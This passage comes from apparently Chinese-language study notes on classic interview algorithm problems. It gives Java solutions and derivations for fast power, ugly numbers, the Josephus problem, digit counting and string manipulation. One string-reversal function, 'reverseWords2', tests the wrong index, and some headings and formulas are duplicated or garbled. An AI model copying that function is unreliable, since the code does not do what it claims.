n 和c ，直至进位 c = 0；此时 s=n ，返回 n 即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span> </span>&#123;<br>    <span class="hljs-keyword">while</span>(b != <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-comment">//进位运算</span><br>        <span class="hljs-keyword">int</span> c = (a &amp; b) &lt;&lt; <span class="hljs-number">1</span>;<br>        <span class="hljs-comment">//无进位运算</span><br>        a ^= b;<br>        b = c;<br>    &#125;<br>    <span class="hljs-keyword">return</span> a;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="9-数学推导"><a href="#9-数学推导" class="headerlink" title="9. 数学推导"></a>9. 数学推导</h1><h2 id="9-1-数值的整数次方"><a href="#9-1-数值的整数次方" class="headerlink" title="9.1 数值的整数次方"></a>9.1 数值的整数次方</h2><p>​    题目：给定一个double类型的浮点数base和int类型的整数exponent。求base的exponent次方。保证base和exponent不同时为0。</p><p>​    简单的方法是直接累乘，但是还有简化计算的方法，4×4要比2×2×2×2方便计算。所以可以递归计算，也可使用循环计算，递归计算的思路很好实现，但会借助递归空间。</p><p>​    循环计算是每次将n/2，此时记x*=x，如果是n%2==1就先计入res</p><ul><li>二分推导：$ x^n = x^{n/2} \times x^{n/2} = (x^2)^{n/2} $  ，令 $n/2$ 为整数，则需要分为奇偶两种情况（设向下取整除法符号为 “//“ ）：<ul><li>当 n 为偶数： $x^n = (x^2)^{n//2}$ ;</li><li>当 n 为奇数： $x^n = x(x^2)^{n//2}$ ，即会多出一项 x ；</li></ul></li><li>幂结果获取：<ul><li>根据二分推导，可通过循环 $x = x^2$  操作，每次把幂从 n 降至 n//2 ，直至将幂降为 0 ；<br>设 res=1 ，则初始状态 $x^n = x^n \times res$  。在循环二分时，每当 n 为奇数时，将多出的一项 x 乘入 res ，则最终可化至 $x^n = x^0 \times res = res$  ，返回 res 即可。</li></ul></li><li>转化为位运算：<ul><li>向下整除 n//2 等价于 右移一位 n&gt;&gt;1 ；<br>取余数 n%2 等价于 判断二进制最右一位值 n&amp;1 ；</li></ul></li></ul><p>​    Java 代码中 int32 变量 n∈[−2147483648,2147483647] ，因此当 n = -2147483648时执行n=−n 会因越界而赋值出错。解决方法是先将 n 存入 long 变量 b ，后面用 b操作即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">double</span> <span class="hljs-title">myPow</span><span class="hljs-params">(<span class="hljs-keyword">double</span> x, <span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (x == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-keyword">double</span> res = <span class="hljs-number">1.0</span>;<br>        <span class="hljs-keyword">long</span> b = n;<br>        <span class="hljs-keyword">if</span> (b &lt; <span class="hljs-number">0</span>) &#123;<br>            b = -b;<br>            x = <span class="hljs-number">1</span> / x;<br>        &#125;<br>        <span class="hljs-keyword">while</span> (b &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">if</span> ((b &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">1</span>) &#123;<br>                res *= x;<br>            &#125;<br>            x *= x;<br>            b&gt;&gt;=<span class="hljs-number">1</span>;<br>        &#125;<br>       <span class="hljs-keyword">return</span> res;<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="9-2-打印从1到最大的n位数"><a href="#9-2-打印从1到最大的n位数" class="headerlink" title="9.2  打印从1到最大的n位数"></a>9.2  打印从1到最大的n位数</h2><p>​    题目：输入数字 <code>n</code>，按输入数字 n，按顺序打印出从 1 到最大的 n 位十进制数。比如输入 3，则打印出 1、2、3 一直到最大的 3 位数 999。顺序打印出从 1 到最大的 n 位十进制数。比如输入 3，则打印出 1、2、3 一直到最大的 3 位数 999。</p><p>不考虑大数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] printNumbers(<span class="hljs-keyword">int</span> n) &#123;<br>    <span class="hljs-keyword">int</span> end = (<span class="hljs-keyword">int</span>) Math.pow(<span class="hljs-number">10</span>,n)-<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">int</span>[] nums = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[end];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i &lt; end;i++)&#123;<br>        nums[i] = i+<span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> nums;<br>&#125;<br></code></pre></td></tr></table></figure><p>考虑大数：</p><h2 id="9-3-1～n整数中1出现的次数√"><a href="#9-3-1～n整数中1出现的次数√" class="headerlink" title="9.3 1～n整数中1出现的次数√"></a>9.3 1～n整数中1出现的次数√</h2><p>​    题目：输入一个整数 n ，求1～n这n个整数的十进制表示中1出现的次数。例如，输入12，1～12这些整数中包含1 的数字有1、10、11和12，1一共出现了5次。</p><p>注意low , high, deight, cur 更新的顺序。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">countDigitOne</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> low = <span class="hljs-number">0</span>, high = n/<span class="hljs-number">10</span>, cur = n % <span class="hljs-number">10</span>; <br>    <span class="hljs-keyword">int</span> dight = <span class="hljs-number">1</span>, res = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(high != <span class="hljs-number">0</span> || cur != <span class="hljs-number">0</span> )&#123;<br>        <span class="hljs-keyword">if</span> (cur == <span class="hljs-number">0</span>)&#123;<br>            res += high * dight;<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cur == <span class="hljs-number">1</span>)&#123;<br>            res += high * dight + low +<span class="hljs-number">1</span>;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            res += (high + <span class="hljs-number">1</span>) * dight;<br>        &#125;<br>        low += cur * dight;<br>        cur = high % <span class="hljs-number">10</span>;<br>        high /= <span class="hljs-number">10</span>;<br>        dight *= <span class="hljs-number">10</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="9-4-数字序列中某一位的数字"><a href="#9-4-数字序列中某一位的数字" class="headerlink" title="9.4 数字序列中某一位的数字"></a>9.4 数字序列中某一位的数字</h2><p>​    题目：数字以0123456789101112131415…的格式序列化到一个字符序列中。在这个序列中，第5位（从下标0开始计数）是5，第13位是1，第19位是4，等等。</p><p>​    请写一个函数，求任意第n位对应的数字。</p><ul><li>限制：<code>0 &lt;= n &lt; 2^31</code></li></ul><p><font color='red'>注意</font>start和num，count为long，注意计算所在位数要考虑排除开头的0</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">findNthDigit</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>        <span class="hljs-comment">//1.确定位数</span><br>        <span class="hljs-keyword">int</span> digit = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">long</span> start = <span class="hljs-number">1</span>, count = <span class="hljs-number">9</span>;<br>        <span class="hljs-keyword">while</span> (n &gt; count)&#123;<br>            n -= count;<br>            start *= <span class="hljs-number">10</span>;<br>            digit++;<br>            count = <span class="hljs-number">9</span> * start * digit;<br>        &#125;<br>        <span class="hljs-comment">//2.确定所在数字</span><br>        <span class="hljs-keyword">long</span> num = start + (n-<span class="hljs-number">1</span>) / digit;<br>        <span class="hljs-comment">//3.n在数字哪一位</span><br>        <span class="hljs-keyword">return</span> Long.toString(num).charAt((n-<span class="hljs-number">1</span>) % digit) - <span class="hljs-string">&#x27;0&#x27;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="9-5-丑数"><a href="#9-5-丑数" class="headerlink" title="9.5 丑数"></a>9.5 丑数</h2><p>​    题目：我们把只包含质因子 2、3 和 5 的数称作丑数（Ugly Number）。求按从小到大的顺序的第 n 个丑数。</p><p>​    设已知长度为 n 的丑数序列$ x<em>1, x_2, \cdots , x_n$  ，求第 n+1 个丑数 $x</em>{n+1}$ 。根据递推性质，丑数 $x_{n+1}$只可能是以下三种情况其中之一（索引 a, b, c为未知数）：</p><script type="math/tex; mode=display">x_{n+1} = \begin{cases} x_{a} \times 2 & ,a \in [1, n] \\ x_{b} \times 3 & ,b \in [1, n] \\ x_{c} \times 5 & ,c \in [1, n] \end{cases}</script><p>由于 $x_{n+1}$ 是 <strong>最接近</strong> $x_n$ 的丑数，因此索引 <em>a</em>,<em>b</em>,<em>c</em> 需满足以下条件：</p><script type="math/tex; mode=display">\begin{cases} x_{a} \times 2 > x_n \geq x_{a-1} \times 2 & ，即 x_a 为首个乘以 2 后大于 x_n 的丑数 \\ x_{b} \times 3 > x_n \geq x_{b-1} \times 3 & ，即 x_b 为首个乘以 3 后大于 x_n 的丑数 \\ x_{c} \times 5 > x_n \geq x_{c-1} \times 5 & ，即 x_c 为首个乘以 5 后大于 x_n 的丑数 \\ \end{cases}</script><p>​    若索引 a,b,ca,b,c 满足以上条件，则可使用递推公式计算下个丑数 $x_{n+1}$ ，其为三种情况中的最小值，即：</p><script type="math/tex; mode=display">x_{n+1} = \min(x_{a} \times 2, x_{b} \times 3, x_{c} \times 5)</script><p>​    因此，可设置指针 a,b,c指向首个丑数（即 1 ），循环根据递推公式得到下个丑数，并每轮将对应指针执行 +1即可。</p><p><img src="https://pic.leetcode-cn.com/837411664f096417badf857fa51e77fd30cb1309a5637c37d24d8a4a48a42b03-Picture1.png" alt="Picture1.png" style="zoom: 50%;" /></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">nthUglyNumber</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> a = <span class="hljs-number">0</span>, b = <span class="hljs-number">0</span>, c = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">int</span> dp[] = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n];<br>        dp[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-keyword">int</span> n2 = dp[a] * <span class="hljs-number">2</span>, n3 = dp[b] * <span class="hljs-number">3</span>, n5 = dp[c] * <span class="hljs-number">5</span>;<br>            dp[i] = Math.min(n2, Math.min(n3, n5));<br>            <span class="hljs-keyword">if</span> (dp[i] == n2) &#123;<br>                a++;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (dp[i] == n3) &#123;<br>                b++;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (dp[i] == n5) &#123;<br>                c++;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> dp[n - <span class="hljs-number">1</span>];<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="9-6-圆圈中最后剩下的数字"><a href="#9-6-圆圈中最后剩下的数字" class="headerlink" title="9.6 圆圈中最后剩下的数字"></a>9.6 圆圈中最后剩下的数字</h2><p>​    题目：0,1,,n-1这n个数字排成一个圆圈，从数字0开始，每次从这个圆圈里删除第m个数字。求出这个圆圈里剩下的最后一个数字。</p><p>​    例如，0、1、2、3、4这5个数字组成一个圆圈，从数字0开始每次删除第3个数字，则删除的前4个数字依次是2、0、4、1，因此最后剩下的数字是3。</p><p>题解：</p><p>​    我们有n个数，下标从0到n-1，然后从<code>index=0</code>开始数，每次数m个数，最后看能剩下谁。我们假设能剩下的数的<strong>下标</strong>为y，则我们把这件事表示为</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">f</span><span class="hljs-params">(n,m)</span></span> = y<br></code></pre></td></tr></table></figure><p>​    这个y到底表示了啥呢？注意，y是下标，所以就意味着你从<code>index=0</code>开始数，数y+1个数，然后就停，停谁身上谁就是结果。</p><p>​    行了，我们假设<code>f(n-1,m)=x</code>，然后来找一找<code>f(n,m)</code>和<code>f(n-1,m)</code>到底啥关系。</p><p><code>f(n-1,m)=x</code>意味着啥呢？意味着有n-1个数的时候从<code>index=0</code>开始数，数x+1个数你就找到这结果了。那我不从<code>index=0</code>开始数呢？比如我从<code>index=i</code>开始数？那很简单，你把上面的答案也往后挪i下，就得到答案了。当然了，你要是挪到末尾了你就取个余，从头接着挪。</p><p>于是我们来思考<code>f(n,m)</code>时考虑以下两件事：</p><ol><li>有n个数的时候，要划掉一个数，然后就剩n-1个数了呗，那划掉的这个数，<strong>下标</strong>是多少？</li><li>划完了这个数，往后数，数x+1个数，停在谁身上谁就是我们的答案。当然了，数的过程中你得取余</li></ol><p><strong>问题一</strong>：有n个数的时候，划掉了谁？<strong>下标</strong>是多少？</p><p>​    因为要从0数m个数，那最后肯定落到了下标为m-1的数身上了，但这个下标可能超过我们有的最大下标（n-1）了。所以攒满n个就归零接着数，逢n归零，所以要模n。</p><p>​    所以有n个数的时候，我们划掉了下标为<code>(m-1)%n</code>的数字。</p><p><strong>问题二</strong>：我们划完了这个数，往后数x+1下，能落到谁身上呢，它的下标是几？</p><p>​    你往后数x+1，它下标肯定变成了<code>(m-1)%n +x+1</code>，和第一步的想法一样，你肯定还是得取模，所以答案为<code>[(m-1)%n+x+1]%n</code>，则</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang"><span class="hljs-function"><span class="hljs-title">f</span><span class="hljs-params">(n,m)</span>=[<span class="hljs-params">(m-<span class="hljs-number">1</span>)</span>%<span class="hljs-title">n</span>+<span class="hljs-title">x</span>+1]%<span class="hljs-title">n</span></span><br></code></pre></td></tr></table></figure><p>​    其中<code>x=f(n-1,m)</code></p><p>​    我们化简它！</p><p>定理一：两个正整数a，b的和，模另外一个数c，就等于它俩分别模c，模完之后加起来再模。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">(a+b)%c=((a%c)+(b%c))%c<br></code></pre></td></tr></table></figure><p>定理二：一个正整数a，模c，模一遍和模两遍是一样的。</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">a<span class="hljs-meta">%</span>c=<span class="hljs-comment">(a%c)</span><span class="hljs-meta">%</span>c<br></code></pre></td></tr></table></figure><p>你稍微一琢磨就觉得，嗯，说得对。</p><p>所以</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl">f(n,<span class="hljs-keyword">m</span>)=[(<span class="hljs-keyword">m</span>-<span class="hljs-number">1</span>)%n+<span class="hljs-keyword">x</span>+<span class="hljs-number">1</span>]%n<br>      =[(<span class="hljs-keyword">m</span>-<span class="hljs-number">1</span>)%n%n+(<span class="hljs-keyword">x</span>+<span class="hljs-number">1</span>)%n]%n<br>      =[(<span class="hljs-keyword">m</span>-<span class="hljs-number">1</span>)%n+(<span class="hljs-keyword">x</span>+<span class="hljs-number">1</span>)%n]%n<br>      =(<span class="hljs-keyword">m</span>-<span class="hljs-number">1</span>+<span class="hljs-keyword">x</span>+<span class="hljs-number">1</span>)%n<br>      =(<span class="hljs-keyword">m</span>+<span class="hljs-keyword">x</span>)%n<br></code></pre></td></tr></table></figure><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">lastRemaining</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n, <span class="hljs-keyword">int</span> m)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> f(n,m);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> <span class="hljs-title">f</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n, <span class="hljs-keyword">int</span> m)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (n == <span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">int</span> x = f(n-<span class="hljs-number">1</span>,m);<br>    <span class="hljs-keyword">return</span> (m + x) % n;<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="10-字符串"><a href="#10-字符串" class="headerlink" title="10. 字符串"></a>10. 字符串</h1><h2 id="10-1-替换空格"><a href="#10-1-替换空格" class="headerlink" title="10.1 替换空格"></a>10.1 替换空格</h2><p>题目：请实现一个函数，将一个字符串中的每个空格替换成“%20”。例如，当字符串为We Are Happy.则经过替换之后的字符串为We%20Are%20Happy。</p><p>​    首先自己实现了一下，思路是遍历字符数组，遇到空格就替换，这样的思路比较简单，事实上在编写时也发现是不可行的，因为“%20”和空格占位是不一样的，简单的把空格替换为”%20”会覆盖掉原本空格后面的空间。</p><p>​    正确的思路是不必在原来的字符串上进行操作，而是建立一个新的字符串sb进行接收，判定原来的字符串str中字符为空格时使用sb.append(“%20”)方法操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JZ2</span> </span>&#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    请实现一个函数，将一个字符串中的每个空格替换成“%20”。例如，</span><br><span class="hljs-comment">    当字符串为We Are Happy.则经过替换之后的字符串为We%20Are%20Happy。</span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        StringBuffer str = <span class="hljs-keyword">new</span> StringBuffer(<span class="hljs-string">&quot;We Are Happy&quot;</span>);<br><span class="hljs-comment">//        str.replace(0,1,&quot;ok&quot;);</span><br>        String str1 = replaceSpace(str);<br>        System.out.println(str1);<br>    &#125;<br><br>    <span class="hljs-comment">//解法1 使用Java自带函数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;<br>        <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">replaceSpace</span><span class="hljs-params">(StringBuffer str)</span> </span>&#123;<br>            <span class="hljs-keyword">return</span> str.toString().replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;%20&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">//解法2 使用新的字符串接收</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">replaceSpace</span><span class="hljs-params">(StringBuffer str)</span> </span>&#123;<br>        StringBuilder sb = <span class="hljs-keyword">new</span> StringBuilder();<br>        <span class="hljs-keyword">int</span> slength = str.length();<br>        <span class="hljs-keyword">int</span> i;<br>        <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>;i&lt;slength;i++)&#123;<br>            <span class="hljs-keyword">char</span> c = str.charAt(i);<br>            <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27; &#x27;</span>)&#123;<br>                sb.append(<span class="hljs-string">&quot;%20&quot;</span>);<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                sb.append(c);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> sb.toString();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="10-2-第一个只出现一次的字符"><a href="#10-2-第一个只出现一次的字符" class="headerlink" title="10.2 第一个只出现一次的字符"></a>10.2 第一个只出现一次的字符</h2><p>​    题目：在字符串 s 中找出第一个只出现一次的字符。如果没有，返回一个单空格。 s 只包含小写字母。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">char</span> <span class="hljs-title">firstUniqChar</span><span class="hljs-params">(String s)</span> </span>&#123;<br>     HashMap&lt;Character,Boolean&gt; dic = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>     <span class="hljs-keyword">char</span>[] sc = s.toCharArray();<br>     <span class="hljs-keyword">for</span> (<span class="hljs-keyword">char</span> c : sc)&#123;<br>         dic.put(c,!dic.containsKey(c));<br>     &#125;<br>     <span class="hljs-keyword">for</span> (<span class="hljs-keyword">char</span> c : sc)&#123;<br>         <span class="hljs-keyword">if</span> (dic.get(c))&#123;<br>             <span class="hljs-keyword">return</span> c;<br>         &#125;<br>     &#125;<br>     <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27; &#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="10-3-反转单词顺序"><a href="#10-3-反转单词顺序" class="headerlink" title="10.3 反转单词顺序"></a>10.3 反转单词顺序</h2><p>​    题目：输入一个英文句子，翻转句子中单词的顺序，但单词内字符的顺序不变。为简单起见，标点符号和普通字母一样处理。例如输入字符串”I am a student. “，则输出”student. a am I”。</p><p>使用内置函数（面试不建议使用）</p><p><img src="https://pic.leetcode-cn.com/9ef4a9ea565bf1c2d9209ca94881a77288f90f222476cfd44c418fa3f2d2d7c1-Picture0.png" alt="Picture0.png" style="zoom: 33%;" /></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">reverseWords</span><span class="hljs-params">(String s)</span> </span>&#123;<br>        String[] strs = s.trim().split(<span class="hljs-string">&quot; &quot;</span>);<br>        StringBuilder sb = <span class="hljs-keyword">new</span> StringBuilder();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = strs.length - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>            <span class="hljs-keyword">if</span> (strs[i].equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>           <span class="hljs-comment">//若两单词间有x&gt;1个空格，则在单词列表strs中，此两单词间会多出x - 1个“空单词”(即 &quot;&quot; )</span><br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            sb.append(strs[i] + <span class="hljs-string">&quot; &quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> sb.toString().trim();<br>    &#125;<br></code></pre></td></tr></table></figure><p>字符拼接</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">reverseWords2</span><span class="hljs-params">(String s)</span> </span>&#123;<br>        s = s.trim();<br>        <span class="hljs-keyword">int</span> i = s.length() - <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">int</span> j = i;<br>        StringBuilder sb = <span class="hljs-keyword">new</span> StringBuilder();<br>        <span class="hljs-keyword">while</span> (i &gt;= <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">while</span> (i &gt;= <span class="hljs-number">0</span> &amp;&amp; s.charAt(j) != <span class="hljs-string">&#x27; &#x27;</span>) &#123;<br>                i--;<br>            &#125;<br>            sb.append(s.substring(i + <span class="hljs-number">1</span>, j + <span class="hljs-number">1</span>) + <span class="hljs-string">&quot; &quot;</span>);<br>            <span class="hljs-keyword">while</span> (i &gt;= <span class="hljs-number">0</span> &amp;&amp; s.charAt(i) == <span class="hljs-string">&#x27; &#x27;</span>)<br>                i--;<br>            j = i;<br>        &#125;<br>        <span class="hljs-keyword">return</span> sb.toString();<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="10-4-反转单词顺序"><a href="#10-4-反转单词顺序" class="headerlink" title="10.4 反转单词顺序"></a>10.4 反转单词顺序</h2><p>​    题目：字符串的左旋转操作是把字符串前面的若干个字符转移到字符串的尾部。请定义一个函数实现字符串左旋转操作的功能。比如，输入字符串”abcdefg”和数字2，该函数将返回左旋转两位得到的结果”cdefgab”。</p><p>内置函数（不推荐）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">reverseLeftWords</span><span class="hljs-params">(String s, <span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> s.substring(n)+s.substring(<span class="hljs-number">0</span>,n);<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="10-5-把字符串转换成整数"><a href="#10-5-把字符串转换成整数" class="headerlink" title="10.5 把字符串转换成整数"></a>10.5 把字符串转换成整数</h2><p>​    题目：写一个函数 StrToInt，实现把字符串转换成整数这个功能。不能使用 atoi 